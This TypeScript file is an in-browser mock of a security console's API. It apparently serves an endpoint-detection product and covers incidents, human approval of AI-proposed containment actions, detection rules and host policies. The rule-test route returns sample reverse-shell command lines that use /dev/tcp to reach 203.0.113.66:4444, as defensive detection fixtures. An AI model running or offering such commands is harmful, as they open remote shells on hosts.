import type { ActionRow, Approval, AutonomyMode, Host, Incident, JsonObject, PolicyRow, Rule, RuleStatus, Severity } from "../api/types";
import { ACTIONS, ANOMALIES, AUDIT, HOSTS, INCIDENTS, REVIEWS, RULES, TURNS, policyHistory, t } from "./fixtures";

/** In-browser mock of the /console/api contract (fetch shim). Mutations update in-memory state. */
const state = {
  autonomy: "autonomous" as AutonomyMode,
  hosts: structuredClone(HOSTS) as Host[],
  incidents: structuredClone(INCIDENTS) as Incident[],
  actions: structuredClone(ACTIONS) as ActionRow[],
  rules: structuredClone(RULES) as Rule[],
  audit: structuredClone(AUDIT),
  policies: new Map<string, PolicyRow[]>(HOSTS.map((h) => [h.id, policyHistory(h.id, h.policy_version)])),
};
let auditId = 1000;

const json = (body: unknown, status = 200): Response => new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } });
const fail = (status: number, error: string) => json({ error }, status);
const wait = <T,>(v: T) => new Promise<T>((r) => setTimeout(() => r(v), 120 + Math.random() * 180));
const rec = (v: unknown): JsonObject => (typeof v === "object" && v !== null ? (v as JsonObject) : {});

function audit(actor: string, event: string, extra: Partial<{ incident_id: string; host_id: string; action_id: string }>, detail: unknown) {
  state.audit.unshift({ id: ++auditId, ts: new Date().toISOString(), actor, event, incident_id: extra.incident_id ?? null, host_id: extra.host_id ?? null, action_id: extra.action_id ?? null, detail });
}
const me = "human:dev@local";

function overview() {
  const open = state.incidents.filter((i) => !i.status.startsWith("closed"));
  const by: Partial<Record<Severity, number>> = {};
  open.forEach((i) => { by[i.severity] = (by[i.severity] ?? 0) + 1; });
  const hourly = Array.from({ length: 24 }, (_, k) => ({ hour: new Date(Date.now() - (23 - k) * 3600_000).toISOString(), count: Math.round(4 + 10 * Math.abs(Math.sin(k / 3)) + (k > 19 ? 14 : 0)) }));
  const off = state.hosts.filter((h) => !h.last_seen || Date.now() - new Date(h.last_seen).getTime() > 120_000).length;
  return {
    hosts: { total: state.hosts.length, online: state.hosts.length - off, offline: off, isolated: state.hosts.filter((h) => h.status === "isolated").length },
    incidents_by_severity: by, pending_approvals: state.actions.filter((a) => a.state === "proposed" && a.tier === 1).length,
    anomalies_24h_hourly: hourly, ai_actions_24h: state.actions.filter((a) => a.proposed_by === "ai").length + 17, autonomy: state.autonomy,
  };
}

function route(method: string, path: string, q: URLSearchParams, body: JsonObject): Response {
  let m: RegExpExecArray | null;
  if (method === "GET" && path === "/me") return json({ email: "dev@local" });
  if (method === "GET" && path === "/overview") return json(overview());
  if (method === "GET" && path === "/hosts") return json(state.hosts.map((h) => ({ ...h, open_incidents: state.incidents.filter((i) => i.host_id === h.id && !i.status.startsWith("closed")).length })));
  if ((m = /^\/hosts\/([^/]+)$/.exec(path)) && method === "GET") {
    const host = state.hosts.find((h) => h.id === m![1]);
    if (!host) return fail(404, "host not found");
    const pol = state.policies.get(host.id) ?? [];
    return json({ host, anomalies: ANOMALIES.filter((a) => a.host_id === host.id), incidents: state.incidents.filter((i) => i.host_id === host.id), actions: state.actions.filter((a) => a.host_id === host.id), policy: pol[pol.length - 1] ?? null });
  }
  if ((m = /^\/hosts\/([^/]+)\/autonomy$/.exec(path)) && method === "POST") {
    const h = state.hosts.find((x) => x.id === m![1]);
    if (!h) return fail(404, "host not found");
    h.autonomy = (body.mode as AutonomyMode | null) ?? null;
    audit(me, "host.autonomy", { host_id: h.id }, { mode: h.autonomy });
    return json({ ok: true });
  }
  if (path === "/settings/autonomy") {
    if (method === "POST") { state.autonomy = body.mode as AutonomyMode; audit(me, "autonomy.changed", {}, { mode: state.autonomy }); }
    return json({ mode: state.autonomy });
  }
  if (method === "GET" && path === "/incidents") {
    let l = state.incidents;
    for (const [k, f] of [["status", (i: Incident, v: string) => i.status === v], ["severity", (i: Incident, v: string) => i.severity === v], ["host", (i: Incident, v: string) => i.host_id === v]] as const) {
      const v = q.get(k); if (v) l = l.filter((i) => f(i, v));
    }
    return json(l);
  }
  if ((m = /^\/incidents\/([^/]+)$/.exec(path)) && method === "GET") {
    const incident = state.incidents.find((i) => i.id === m![1]);
    if (!incident) return fail(404, "incident not found");
    return json({ incident, anomalies: ANOMALIES.filter((a) => a.incident_id === incident.id), reviews: REVIEWS.filter((r) => r.incident_id === incident.id), actions: state.actions.filter((a) => a.incident_id === incident.id), audit: state.audit.filter((a) => a.incident_id === incident.id).reverse(), turns: TURNS.filter((x) => x.incident_id === incident.id) });
  }
  if ((m = /^\/incidents\/([^/]+)\/verdict$/.exec(path)) && method === "POST") {
    const i = state.incidents.find((x) => x.id === m![1]);
    if (!i) return fail(404, "incident not found");
    i.verdict = body.verdict as Incident["verdict"]; i.status = body.verdict === "true_positive" ? "closed_tp" : "closed_benign"; i.analyst_note = String(body.note ?? ""); i.closed_at = new Date().toISOString();
    audit(me, "incident.verdict", { incident_id: i.id }, body);
    return json({ ok: true });
  }
  if ((m = /^\/incidents\/([^/]+)\/ask$/.exec(path)) && method === "POST")
    return json({ answer: `(mock analyst) Based on the evidence, "${String(body.question)}" - the nginx worker spawned an interactive bash that connected out to 203.0.113.66:4444. The parent process and the preceding POST to /upload.php suggest exploitation of the upload handler. I cannot take actions; use the controls on this page to respond.` });
  if (method === "GET" && path === "/approvals") {
    const list: Approval[] = state.actions.filter((a) => a.state === "proposed" && a.tier === 1).map((a) => ({ ...a, incident: state.incidents.find((i) => i.id === a.incident_id) ?? null, host: state.hosts.find((h) => h.id === a.host_id) ?? null }));
    return json(list);
  }
  if ((m = /^\/actions\/([^/]+)\/(approve|reject|rollback)$/.exec(path)) && method === "POST") {
    const a = state.actions.find((x) => x.id === m![1]);
    if (!a) return fail(404, "action not found");
    if (m[2] === "reject") { if (!String(body.reason ?? "").trim()) return fail(400, "reason required"); a.state = "rejected"; a.reject_reason = String(body.reason); }
    else if (m[2] === "approve") {
      a.state = "succeeded"; a.approved_by = "dev@local";
      if (body.params) a.params = rec(body.params);
      if (typeof body.ttl_seconds === "number") a.params = { ...a.params, ttl_seconds: body.ttl_seconds };
      if (a.action === "block_ip" || a.action === "isolate_host") a.rollback_token = `rb-${a.id}`;
      if (a.action === "isolate_host") { const h = state.hosts.find((x) => x.id === a.host_id); if (h) h.status = "isolated"; }
    } else { a.state = "rolled_back"; a.rollback_token = null; }
    a.updated_at = new Date().toISOString();
    audit(me, `action.${m[2] === "rollback" ? "rolled_back" : m[2] + (m[2] === "approve" ? "d" : "ed")}`, { action_id: a.id, host_id: a.host_id, incident_id: a.incident_id ?? undefined }, body);
    const inc = state.incidents.find((i) => i.id === a.incident_id);
    if (inc && !state.actions.some((x) => x.incident_id === inc.id && x.state === "proposed" && x.tier === 1) && inc.status === "awaiting_approval") inc.status = "contained";
    return json({ ok: true });
  }
  if (method === "POST" && path === "/actions") {
    const a: ActionRow = { id: crypto.randomUUID(), incident_id: (body.incident_id as string) ?? null, host_id: String(body.host_id), action: body.action as ActionRow["action"], params: rec(body.params), tier: 1, kind: "command", state: "dispatched",
      proposed_by: me, rationale: "manual", approved_by: "dev@local", reject_reason: null, result: null, error: null, rollback_token: null, rollback_of: null, expires_at: null, created_at: new Date().toISOString(), updated_at: new Date().toISOString() };
    state.actions.unshift(a);
    audit(me, "action.manual", { action_id: a.id, host_id: a.host_id }, body);
    return json(a);
  }
  if (method === "GET" && path === "/audit") {
    const before = Number(q.get("before") ?? Infinity);
    return json(state.audit.filter((a) => a.id < before).slice(0, Number(q.get("limit") ?? 50)));
  }
  if (method === "GET" && path === "/rules") return json(state.rules);
  if (method === "POST" && path === "/rules/lint") {
    const y = String(body.yaml ?? "");
    const errors = ["title", "logsource", "detection", "level"].filter((k) => !new RegExp(`^${k}:`, "m").test(y)).map((k) => `missing required field: ${k}`);
    return json({ ok: errors.length === 0, errors });
  }
  if (method === "POST" && path === "/rules") {
    const y = String(body.yaml ?? "");
    const r: Rule = { id: crypto.randomUUID(), pack_id: "custom", pack_name: "Custom", title: /^title:\s*(.+)$/m.exec(y)?.[1] ?? "Untitled", level: (/^level:\s*(\w+)/m.exec(y)?.[1] ?? "medium") as Severity, logsource: null, attack_tags: [], yaml: y,
      status: body.status as RuleStatus, created_by: me, hits_total: 0, fp_total: 0, tp_total: 0, shadow_since: null, created_at: new Date().toISOString(), updated_at: new Date().toISOString() };
    state.rules.unshift(r);
    return json(r);
  }
  if ((m = /^\/rules\/([^/]+)\/status$/.exec(path)) && method === "POST") {
    const r = state.rules.find((x) => x.id === m![1]); if (!r) return fail(404, "rule not found");
    r.status = body.status as RuleStatus; audit(me, "rule.status", {}, { rule: r.id, status: r.status });
    return json({ ok: true });
  }
  if ((m = /^\/rules\/([^/]+)\/test$/.exec(path)) && method === "POST")
    return json({ matches: 3, samples: [{ ts: t(120), image: "/bin/bash", cmdline: "bash -c 'exec 5<>/dev/tcp/10.0.0.5/80'" }, { ts: t(75), image: "/bin/bash", cmdline: "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1" }] });
  if (method === "GET" && path === "/coverage")
    return json({ techniques: [["T1059.004", 3, 14], ["T1105", 2, 31], ["T1053.003", 1, 22], ["T1098.004", 1, 4], ["T1548.003", 1, 57], ["T1070.003", 1, 6], ["T1003.008", 1, 1], ["T1110.001", 2, 58], ["T1046", 1, 19], ["T1571", 1, 3], ["T1486", 1, 0]].map(([id, rules, hits_30d]) => ({ id, rules, hits_30d })) });
  if ((m = /^\/policies\/([^/]+)$/.exec(path))) {
    const l = state.policies.get(m[1]); if (!l) return fail(404, "no policy");
    if (method === "POST") {
      l.push({ host_id: m[1], version: l.length + 1, body: body.body as PolicyRow["body"], created_by: me, reason: String(body.reason), created_at: new Date().toISOString() });
      const h = state.hosts.find((x) => x.id === m![1]); if (h) h.policy_version = l.length;
      audit(me, "policy.updated", { host_id: m[1] }, { version: l.length, reason: body.reason });
      return json({ ok: true, version: l.length });
    }
    return json(l);
  }
  if (method === "POST" && path === "/enroll-tokens") return json({ token: "aegis_" + crypto.randomUUID().replace(/-/g, ""), expires_at: new Date(Date.now() + Number(body.ttl_hours ?? 24) * 3600_000).toISOString() });
  if (method === "POST" && path === "/iocs/import") return json({ imported: 12 });
  if (method === "GET" && path === "/evidence") return json({ key: q.get("key"), captured_at: t(41), connections: [{ proto: "tcp", local: "10.0.1.5:51522", remote: "203.0.113.66:4444", state: "ESTABLISHED", pid: 28113 }], note: "mock R2 object" });
  if (path.startsWith("/export/")) return json({ mock: true });
  return fail(404, `mock: no route for ${method} ${path}`);
}

export function installMockApi(): void {
  const real = window.fetch.bind(window);
  window.fetch = async (input: RequestInfo | URL, init?: RequestInit): Promise<Response> => {
    const url = new URL(typeof input === "string" ? input : input instanceof URL ? input.href : input.url, location.origin);
    if (!url.pathname.startsWith("/console/api")) return real(input, init);
    const method = (init?.method ?? "GET").toUpperCase();
    let body: JsonObject = {};
    if (typeof init?.body === "string") { try { body = rec(JSON.parse(init.body)); } catch { /* non-JSON */ } }
    return wait(route(method, url.pathname.slice("/console/api".length), url.searchParams, body));
  };
}
